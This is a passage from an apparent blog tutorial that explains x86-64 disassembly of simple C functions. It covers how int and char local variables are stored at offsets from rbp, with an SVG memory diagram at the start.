<text text-anchor='middle' x='504' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='504' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='512' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='512' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='520' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='520' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='528' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='528' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='536' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='536' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='544' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='544' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='552' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='552' y='436' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='560' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='560' y='436' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='568' y='292' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='568' y='436' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='576' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='576' y='436' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='584' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='584' y='436' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='608' y='132' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='608' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='276' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='308' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='340' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='372' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='404' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='452' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='608' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='608' y='660' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='616' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='436' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='648' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='84' fill='currentColor' style='font-size:1em'>M</text>
<text text-anchor='middle' x='656' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='436' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='656' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='84' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='664' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='436' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='664' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='84' fill='currentColor' style='font-size:1em'>M</text>
<text text-anchor='middle' x='672' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='84' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='680' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='84' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='688' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='84' fill='currentColor' style='font-size:1em'>Y</text>
<text text-anchor='middle' x='696' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='660' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='132' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='776' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='276' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='308' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='340' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='372' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='404' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='452' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='776' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='776' y='660' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='808' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='808' y='420' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='824' y='436' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='832' y='292' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='832' y='436' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='840' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='840' y='436' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='848' y='292' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='848' y='436' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='856' y='292' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='864' y='292' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='864' y='436' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='880' y='436' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='888' y='436' fill='currentColor' style='font-size:1em'>)</text>
</g>

    </svg>
  
</div>
<p>This should give you a little idea of how the references work and where does the <code>0x1</code> is actually stored.</p>
<p>With that out of our plate, let&rsquo;s get back to the original instruction in question - <code>mov     DWORD PTR [rbp-4], 1</code>. This instruction surely stores the value <code>0x1</code> in the location pointed by <code>rbp - 4</code> memory location.</p>
<p>Then there is the same old <code>nop</code> and <code>epilogue</code>. Nothing new here. Let&rsquo;s add more variables to the function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">c</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">d</span><span class="o">=</span><span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">e</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Below is the disassembly for this</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">],</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-20</span><span class="p">],</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Each variable is created in sequence and have a space of <code>4</code> bytes to save an <code>int</code> type data in it. <code>Int</code> data types have a size of <code>4</code> bytes, so this makes sense.</p>
<p>Another commonly used data type is <code>char</code>, which requires a smaller size than <code>int</code>, <code>1 byte</code> in total.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">c</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">d</span><span class="o">=</span><span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">e</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Yes, the above program is completely correct from the standpoint of a compiler. When storing data in char types, we don&rsquo;t always need single quotes.</p>
<p>Anyway, the disassembly for this is as follows:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-1</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-2</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-3</span><span class="p">],</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-5</span><span class="p">],</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>There is now a noticeable difference between this disassembly and the previous one. The <code>DWORD</code> has been changed to <code>BYTE</code> in this case, which means that less memory is required to store this data, as evidenced by the memory locations used for storage - <code>rbp-1,</code> <code>rbp-2</code>, and so on - each of which has only <code>1 byte</code> of storage.</p>
<p>Fun thing, with the help of some computer maths, we can find out that the highest number that can be stored in 1 byte storage location is 127. So if we store any number bigger than this, it&rsquo;ll start shifting to the negative range and then loop back.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;</span>
